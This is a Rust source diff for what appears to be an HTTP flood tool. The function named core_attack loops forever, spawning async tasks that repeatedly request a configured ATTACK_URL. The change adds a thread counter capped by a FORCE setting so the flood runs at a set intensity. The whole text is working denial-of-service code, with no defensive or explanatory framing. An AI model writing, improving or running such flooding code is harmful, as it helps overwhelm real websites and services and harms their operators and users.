@@ -2,6 +2,8 @@ use reqwest::Response;
 
 static mut AMOUNT: u128 = 0;
 
+static mut ON_THREADS: u64 = 0;
+
 pub async fn start() {
     core_attack();
 }
@@ -15,17 +17,24 @@ async fn request(url: &str) -> Result<Response, reqwest::Error> {
 
 fn core_attack() {
     loop {
-        tokio::spawn(async {
-            let error_data = request(&crate::ATTACK_URL).await;
-            match error_data {
-                Ok(_) => unsafe {
-                    AMOUNT = AMOUNT + 1;
-                    println!("{}", AMOUNT);
-                },
-                Err(data) => {
-                    println!("OH NO BAD Status Code Recived is {}", data.to_string())
-                }
+        unsafe {
+            if ON_THREADS < crate::FORCE {
+                tokio::spawn(async {
+                    ON_THREADS = ON_THREADS + 1;
+                    let error_data = request(&crate::ATTACK_URL).await;
+                    match error_data {
+                        Ok(_) => {
+                            AMOUNT = AMOUNT + 1;
+                            ON_THREADS = ON_THREADS - 1;
+                            println!("Ran: {}, On threads: {}", AMOUNT, ON_THREADS);
+                        }
+                        Err(data) => {
+                            ON_THREADS = ON_THREADS - 1;
+                            println!("OH NO BAD Status Code Recived is {}", data.to_string());
+                        }
+                    }
+                });
             }
-        });
+        }
     }
 }
